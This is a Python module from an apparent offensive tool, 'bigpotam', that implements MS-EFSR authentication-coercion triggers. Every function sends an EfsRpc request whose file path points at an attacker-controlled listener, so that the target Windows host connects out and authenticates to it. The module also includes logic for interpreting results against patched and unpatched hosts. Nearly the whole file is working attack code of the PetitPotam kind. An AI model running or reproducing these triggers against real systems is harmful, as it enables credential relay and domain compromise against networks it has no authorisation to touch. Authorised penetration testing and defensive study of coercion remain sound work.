"""MS-EFSR trigger functions."""

import logging

from bigpotam.methods import UNCONFIRMED, check_error
from bigpotam.paths import efsr_path
from bigpotam.structures import (
    EFS_RPC_BLOB,
    ENCRYPTION_CERTIFICATE_HASH_LIST,
    ENCRYPTION_CERTIFICATE_LIST,
    EfsRpcAddUsersToFile,
    EfsRpcAddUsersToFileEx,
    EfsRpcDecryptFileSrv,
    EfsRpcDuplicateEncryptionInfoFile,
    EfsRpcEncryptFileSrv,
    EfsRpcFileKeyInfo,
    EfsRpcFileKeyInfoEx,
    EfsRpcOpenFileRaw,
    EfsRpcQueryRecoveryAgents,
    EfsRpcQueryUsersOnFile,
    EfsRpcRemoveUsersFromFile,
)

log = logging.getLogger("bigpotam")

_SUCCESS_CODES = {0x0000007B}  # ERROR_INVALID_NAME
_SUCCESS_STRINGS = ("ERROR_INVALID_NAME",)

# Hosts with the October 2026 update return ERROR_BAD_NETPATH without
# connecting out, so it no longer proves a callback (p0dalirius/Coercer#110).
# Some functions return ERROR_SUCCESS instead (impacket raises SessionError
# with code 0); unpatched hosts still connect out on those.
_UNCONFIRMED_CODES = {0x00000000, 0x00000035}  # ERROR_SUCCESS, ERROR_BAD_NETPATH
_UNCONFIRMED_STRINGS = ("ERROR_SUCCESS", "ERROR_BAD_NETPATH")


def _unconfirmed(name, result):
    log.warning(
        "  %s: call returned %s, callback unconfirmed: hosts with the "
        "October 2026 update return this without connecting",
        name,
        result,
    )
    return UNCONFIRMED


def _check_result(name, e):
    if check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS):
        return True
    if check_error(e, _UNCONFIRMED_CODES, _UNCONFIRMED_STRINGS):
        code = getattr(e, "error_code", None)
        if code == 0 or (code is None and "ERROR_SUCCESS" in str(e)):
            return _unconfirmed(name, "ERROR_SUCCESS")
        return _unconfirmed(name, "ERROR_BAD_NETPATH")
    log.debug("%s: %s", name, e)
    return False


def trigger_open_file_raw(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcOpenFileRaw()
        request["fileName"] = efsr_path(listener, listener_port)
        request["Flag"] = 0
        dce.request(request)
        return _unconfirmed("EfsRpcOpenFileRaw", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcOpenFileRaw", e)


def trigger_encrypt_file_srv(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcEncryptFileSrv()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return _unconfirmed("EfsRpcEncryptFileSrv", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcEncryptFileSrv", e)


def trigger_decrypt_file_srv(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcDecryptFileSrv()
        request["FileName"] = efsr_path(listener, listener_port)
        request["Flag"] = 0
        dce.request(request)
        return _unconfirmed("EfsRpcDecryptFileSrv", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcDecryptFileSrv", e)


def trigger_query_users_on_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcQueryUsersOnFile()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return _unconfirmed("EfsRpcQueryUsersOnFile", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcQueryUsersOnFile", e)


def trigger_query_recovery_agents(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcQueryRecoveryAgents()
        request["FileName"] = efsr_path(listener, listener_port)
        dce.request(request)
        return _unconfirmed("EfsRpcQueryRecoveryAgents", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcQueryRecoveryAgents", e)


def trigger_remove_users_from_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcRemoveUsersFromFile()
        request["FileName"] = efsr_path(listener, listener_port)
        request["Users"] = ENCRYPTION_CERTIFICATE_HASH_LIST()
        dce.request(request)
        return _unconfirmed("EfsRpcRemoveUsersFromFile", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcRemoveUsersFromFile", e)


def trigger_add_users_to_file(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcAddUsersToFile()
        request["FileName"] = efsr_path(listener, listener_port)
        request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
        dce.request(request)
        return _unconfirmed("EfsRpcAddUsersToFile", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcAddUsersToFile", e)


def trigger_file_key_info(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcFileKeyInfo()
        request["FileName"] = efsr_path(listener, listener_port)
        request["infoClass"] = 0
        dce.request(request)
        return _unconfirmed("EfsRpcFileKeyInfo", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcFileKeyInfo", e)


def trigger_duplicate_encryption_info_file(dce, listener, listener_port=445, **kw):
    try:
        path = efsr_path(listener, listener_port)
        request = EfsRpcDuplicateEncryptionInfoFile()
        request["SrcFileName"] = path
        request["DestFileName"] = path
        request["dwCreationDisposition"] = 0
        request["dwAttributes"] = 0
        request["RelativeSD"] = EFS_RPC_BLOB()
        request["bInheritHandle"] = 0
        dce.request(request)
        return _unconfirmed("EfsRpcDuplicateEncryptionInfoFile", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcDuplicateEncryptionInfoFile", e)


def trigger_add_users_to_file_ex(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcAddUsersToFileEx()
        request["dwFlags"] = 0x00000002  # EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE
        request["FileName"] = efsr_path(listener, listener_port)
        request["EncryptionCertificates"] = ENCRYPTION_CERTIFICATE_LIST()
        dce.request(request)
        return _unconfirmed("EfsRpcAddUsersToFileEx", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcAddUsersToFileEx", e)


def trigger_file_key_info_ex(dce, listener, listener_port=445, **kw):
    try:
        request = EfsRpcFileKeyInfoEx()
        request["dwFileKeyInfoFlags"] = 0x00000001  # BASIC_KEY_INFO
        request["Reserved"] = EFS_RPC_BLOB()
        request["FileName"] = efsr_path(listener, listener_port)
        request["InfoClass"] = 0
        dce.request(request)
        return _unconfirmed("EfsRpcFileKeyInfoEx", "ERROR_SUCCESS")
    except Exception as e:
        return _check_result("EfsRpcFileKeyInfoEx", e)
